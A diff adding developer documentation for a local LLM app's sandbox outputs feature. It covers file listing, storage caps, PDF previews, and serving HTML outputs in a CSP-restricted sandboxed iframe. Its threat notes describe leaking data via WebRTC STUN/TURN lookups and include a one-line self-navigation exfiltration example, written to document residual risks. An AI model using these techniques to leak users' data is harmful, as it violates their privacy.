@@ -769,3 +769,251 @@ cd apps/server
 LLLM_TEST_KATA=1 LLLM_SECRET_KEY=$(python3 -c 'print("x"*40)') \
   uv run --frozen python -m pytest tests/test_sandbox_uploads_kata.py -v -s
 ```
+
+## Outputs
+
+`apps/server/local_llm/sandbox/outputs.py`. The `bash` tool lists
+`/workspace/outputs` after the model's command, inside the call's session,
+which holds the chat's lock, and attaches every file that is new or changed
+in size or modification time. It compares with the listing the last `bash`
+call took after its command, which the manager keeps per sandbox while it
+runs (`SandboxSession.outputs_memory`, `OutputsMemory.listing`), so a file `write_file` or
+`str_replace` put there in between counts as new too. When no listing is
+kept (the sandbox's first call, a container started again, or a call cut
+short), it lists before the command instead; `write_file` and `str_replace`
+also take one before they write, when none is kept, so the next `bash` call
+attaches what they wrote. The model's prompt says that its next `bash` call
+attaches the files. A call keeps its listing for the next only when
+everything went well, so a call stopped or failing while it attached does
+not have its files attached twice; a call stopped during its command,
+before anything was attached, puts the listing from before back, so the
+next call attaches what that command left. The daemon stats the directory first: a
+missing `outputs`, or one that is a symlink, lists nothing, and no listing
+runs. The listing is a fixed script, run with an empty environment and
+absolute paths:
+
+```sh
+{ /usr/bin/find -P /workspace/outputs -xdev -type f -readable -printf '%T@\t%s\t%P\0' 2>/dev/null \
+  | /usr/bin/sort -z -r -n && printf 'END\0'; } | /usr/bin/head -c 16384
+```
+
+`-P` never follows a symlink, so every path listed is free of them. The
+records end with NUL, since a name may hold a tab or a newline, and only
+the last field is free text. The listing is cut at 16 KiB, below the
+stream cap, so the cap never splices two records together. The newest
+files come first, so a cut listing keeps those, and a listing without its
+`END` was cut short: the result's `outputs_note` then tells the model to
+move finished files out. When the listing from before the command was cut,
+a file it does not hold counts as new only if it is newer than the oldest
+file it does hold. `find`'s complaints (a directory it cannot enter) are
+dropped, since stderr counts toward the stream cap too. A listing that
+fails, before or after the command, never costs the command's result:
+`outputs` is empty and `outputs_note` says why.
+
+Each file is read back with `get_files`, stored, and linked to the
+message before the next one is read, so a call cut short (a Stop, a
+database error) leaves unlinked at most the one row it was linking; after a
+database error the result still names what was stored, and the `files`
+event carries it. The caps are 50 MiB per file, and 200 MiB and 20 files
+per call (`limits.py`), charged for every file read, PDF preview pages
+included (a PDF's pages, at most 10 of 8 MiB, are read before they are
+charged, so they can be read and then left out).
+A file whose bytes are those of the last File row stored for its path in
+this chat (the SHA-256, from the rows below, and kept by the manager beside
+the listing while the sandbox runs) is read but not stored or attached
+again, so rewriting or `touch`ing a file adds nothing. Every file left out is named in `outputs`
+with the reason: over a cap, empty, a name that is not UTF-8, no longer a
+regular file, unchanged, not stored, over the chat's cap, the sandbox
+stopped, or a server error came first.
+
+A chat holds at most 1 GiB of sandbox outputs over all its calls, previews
+included (`OUTPUT_CHAT_CAP_BYTES`, owner decision Q22). The total is the
+size of the File rows whose `meta` the server marked as the chat's
+(`source: 'sandbox_output'` and `chat_id`), from one query over `file`,
+whether or not they are linked to a message. So it holds for an unsaved
+chat, for a call with no message id, and across a stopped sandbox or a
+restarted server. An unsaved chat's id is not one the database checks, so
+its rows count only when they are the caller's too, as its sandbox is
+(Q12). The same query's last row per path (by `created_at`, then the
+store's nanosecond clock in `meta.stored_ns`, then the row's id) seeds the
+content check above. A file that would pass the cap is named as not
+attached, saying so. Each file stored is a File row owned by the user,
+whose `meta` has `source: 'sandbox_output'`, `sandbox_path`, `chat_id` and
+`stored_ns`, set by the server when the row is inserted, after anything
+else in it; an upload's own metadata goes under `meta.data`, so no client
+can set them. The rows are written through `Storage` and
+`Files.insert_new_file`, not `upload_file_handler`, which files its
+metadata under `meta.data`. Its name is the base name with control and
+format characters replaced, cut to 200 bytes. It is linked to the message
+(`Chats.insert_chat_files`) when the chat is saved and the call has a
+message id. An unsaved chat's outputs, and those of a call with no message
+id, stay File rows
+of the user's, counted but linked to nothing, like a temporary chat's
+generated images: a row linked to a chat but no message would show on no
+message, yet `chat_file` decides what a shared chat's viewers may open. The tool then sends a
+`files` event with the call's new files only: the chat page and the
+server's socket handler each merge the event into the message's list
+rather than replace it.
+In a benchmark run (`request.state.benchmark_harness`) the files are
+listed, but nothing is read or stored.
+
+A PDF, at most 3 per call, gets PNG previews of its first 10 pages at 80
+dpi, cropped to 1600 pixels a side (`pdftoppm -png -r 80 -l 10 -W 1600 -H
+1600`). The crop keeps a normal page at 80 dpi and never rasterises a huge
+one whole: a 200-inch page at 80 dpi would be 16,000 pixels a side. The
+previews are made once every output has been read, because `pdftoppm` runs
+as UID 1000 on a file the model wrote:
+- it renders into `/workspace/.lllm/previews`, removed and made again for
+  each PDF (whose pages are read before the next renders), and a `.lllm`
+  that is a symlink is refused;
+- a separate exec lists the pages, after the post-exec kill has ended
+  anything `pdftoppm` left behind;
+- the daemon confirms that each directory on the way is a real directory;
+- each page must be a PNG of at most 1600 pixels a side and 8 MiB;
+- the pages count toward the call's 20 files and 200 MiB, and a PDF whose
+  pages stopped at those caps says so in its `previews`.
+
+The pages are stored like the outputs, with `meta.preview_of` (the PDF's
+file id) and `meta.preview_page`; their `sandbox_path` is the PDF's. They
+appear in the `files` event, not in `outputs`.
+
+How they are served:
+- `GET /api/v1/files/{id}/content` and `/content/{name}` send a sandbox
+  output as `attachment` with `X-Content-Type-Options: nosniff` and
+  `Content-Security-Policy: default-src 'none'; sandbox`, whatever its type
+  and the `attachment` query parameter. Its `Content-Type` is its own only
+  for an image (PNG, JPEG, GIF, WebP, SVG), a PDF, audio or video, and
+  `application/octet-stream` otherwise, so no output is served as HTML,
+  script or a style sheet. SVG keeps its type because an `<img>` needs it
+  and never runs its script; opened as a document it is a download, and the
+  policy keeps it inert.
+- `/content/html` refuses one with 403. This applies once access is
+  established, so a caller without access gets the same 404 as for a
+  missing file.
+- The only way to show an HTML output is
+  `GET /api/v1/sandbox/outputs/{id}/html`, under the same access rule as
+  file content. It returns JSON, `{"html": ...}`, so the document never
+  renders on the app's origin, and the frontend shows it as the `srcdoc`
+  of an iframe sandboxed to `allow-scripts`. The route answers 404 for a
+  file that is not an HTML sandbox output, and 413 over 5 MiB.
+
+The document is decoded by its BOM (UTF-8, UTF-16), otherwise as UTF-8,
+and gets this policy in front of it:
+
+```text
+default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:;
+font-src data:; form-action 'none'; base-uri 'none'
+```
+
+It blocks fetches and loads (images and fonts come only from `data:` and
+`blob:`), form submissions and `<base>`. It is not "no network": CSP covers
+neither the frame navigating itself nor WebRTC, whose STUN and TURN lookups
+a script can use to send data out (both under "What the frame can still
+send out" below).
+
+The policy goes after a leading doctype that only HTML whitespace
+precedes, and at the very start otherwise. Text first (a BOM left in the
+text, a non-breaking space) would open `<body>`, where a policy `<meta>` is
+ignored, and a comment first could hide a fake doctype, so neither is
+skipped; a real doctype after the policy is then ignored, which costs only
+quirks mode. A policy the document declares itself can only narrow this
+one.
+
+### On the reply
+
+`apps/web/src/components/chat/SandboxOutputs.tsx`, rendered by
+`ResponseMessage` (`routes/chat/ChatMessages.tsx`), shows the message's
+files whose `meta.source` is `sandbox_output` and whose id is a UUID (the
+only id it puts into a URL), each under its `name`, which the server
+cleaned of control and format characters (never the raw `sandbox_path`),
+with a download link (`/content?attachment=true`). An entry of the wrong
+shape (from a plugin's event or an imported chat) is skipped. It picks a
+renderer by the name's extension, then by `meta.content_type`:
+- PNG, JPEG and SVG: an `<img>` of `/content`, never inline SVG. An SVG
+  shows only because the route keeps its `image/svg+xml` type
+  (`served_type`); browsers never sniff SVG.
+- HTML: `SandboxedHtmlFrame`, an iframe with `sandbox="allow-scripts"` and
+  nothing else, whose `srcdoc` is the route's `html`. A frame of an opaque
+  origin cannot report its own height, so it starts at 360 px and the user
+  sets it: by dragging its corner, or with the Taller and Shorter buttons,
+  which work from the keyboard and announce the new height. An Enlarge
+  button shows the same component, with the same document, in a dialog.
+  Never a `blob:` URL or a new window. It does not reuse `ArtifactPanel`'s
+  frame, whose flags are wider. A file over 5 MiB, or one the route
+  refuses, gets a note instead.
+- PDF: the preview PNGs (`meta.preview_of`), in `meta.preview_page` order.
+- `.tex`, `.py`, `.R`, `.json`, `.md`, `.txt`, `.log` and `text/plain`: the
+  chat's code-block renderer, highlighted, with no Run or Preview button.
+  Only the first 256 KiB is fetched. Registering LaTeX for `.tex` also
+  highlights ```` ```latex ```` blocks in replies, and puts LaTeX among the
+  languages an unlabelled code block is auto-detected as, so a block of
+  math with no language can now highlight as LaTeX.
+- CSV: a table of the first 200 rows, from at most 1 MiB, its first row as
+  the header. A row is at most 50 columns and a cell 1,000 characters, so a
+  file of nothing but commas stays a small table; a row the 1 MiB cut short
+  is left out, and a note says what was cut.
+- Anything else: the download link alone.
+
+A fetch stops when the reply leaves the page (React Query's abort signal).
+
+The chat page merges each `files` event into the message's list
+(`lib/chat/history.ts` `mergeFiles`): an incoming entry replaces the one
+with its id, or, without an id, the id-less one with its url, or else an
+identical one, and is appended otherwise; an entry that is not an object is
+skipped. The server's copy (`socket/main.py` `merge_message_files`) adds an
+entry unless an identical one is there; every sender re-sends identical
+entries, so a reload shows the same list. An unsaved chat's earlier outputs
+stay when a later call sends only its new ones.
+
+`SandboxOutputs.test.tsx` checks each renderer, the frame's exact `sandbox`
+attribute and the dialog's reuse of it, the height controls, the caps and
+malformed entries; `e2e/sandbox-outputs.spec.ts` shows a reply's outputs in
+Chromium with mocked routes that send T17's headers (an SVG among them),
+and checks that the frame's script runs but reaches neither the page nor
+its cookies.
+
+**What the frame can still send out.** The policy blocks fetches, images,
+fonts and form posts, but the frame's script is not cut off from the
+network:
+- **WebRTC.** A script in an HTML output can reach the network over
+  WebRTC. CSP has no directive for it, so the script can open an
+  `RTCPeerConnection` to a STUN or TURN host it names and send data in the
+  ICE traffic (a TURN username, say, or the host name itself through the
+  DNS lookup). It can leak what the model wrote, what the user types into
+  the output, and the user's public IP. This holds in the browser and the
+  desktop app alike; neither the sandbox flags nor the desktop rule below
+  touch it (found in T18's security review, 2026-11-11, on Electron
+  45.1.0). The owner accepted this on 2026-11-11 (Q23): scripts in an
+  output run when the reply shows, without asking.
+- **Navigation (Q4).** Nor do the sandbox flags (without
+  `allow-top-navigation`) or a content-security policy stop a frame
+  navigating itself (`location = 'https://example.com/?data'`); CSP's
+  `navigate-to` never shipped. In a browser this is accepted. The desktop
+  app denies it: its `will-frame-navigate` handler
+  (`apps/desktop/src/policy.ts`, `isAllowedFrameNavigation`) lets a
+  sub-frame showing `about:srcdoc` or `about:blank` go only to another of
+  those, unless the app's own page starts the navigation (an iframe's `src`
+  loading), and refuses a navigation it cannot check. It covers every such
+  frame, so the chat's artifact preview cannot navigate itself away in the
+  desktop app either. It stops navigation only, not WebRTC.
+
+`tests/test_sandbox_outputs.py` runs everywhere. It covers:
+- the listing, which also runs for real with bash, and the FakeBackend's
+  emulation of it against the same tree;
+- the diff, the caps, the rows and their links, and the previews;
+- the `bash` tool end to end on the FakeBackend, with files `write_file`
+  and `str_replace` put in `outputs`, a Stop or a database error while it
+  attaches, and its `files` events saved as `socket/main.py` saves them;
+- the policy's placement and the routes.
+
+`tests/test_sandbox_outputs_kata.py` is the acceptance test "Outputs",
+through the manager and the real `bash` tool on Kata: a matplotlib figure
+saved to `outputs` comes back in `outputs` as a File row linked to the
+message, and a PDF gets its preview PNGs. It needs and skips like
+`tests/test_sandbox_kata.py`:
+
+```sh
+cd apps/server
+LLLM_TEST_KATA=1 LLLM_SECRET_KEY=$(python3 -c 'print("x"*40)') \
+  uv run --frozen python -m pytest tests/test_sandbox_outputs_kata.py -v -s
+```
